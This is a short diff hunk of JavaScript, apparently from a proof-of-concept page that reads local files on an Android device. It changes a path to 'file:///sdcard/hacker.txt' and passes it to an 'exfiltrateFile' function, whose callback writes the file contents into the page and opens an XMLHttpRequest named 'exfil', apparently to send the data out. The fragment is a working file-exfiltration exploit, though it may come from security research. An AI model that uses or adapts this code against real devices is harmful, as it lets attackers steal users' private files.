@@ -14,7 +14,7 @@
         }
         request.send();
       }
-      var filePath = "/sdcard/hacker.txt";
+      var filePath = "file:///sdcard/hacker.txt";
       exfiltrateFile(filePath, function(contents) {
             document.write(contents);
             var exfil = new XMLHttpRequest();
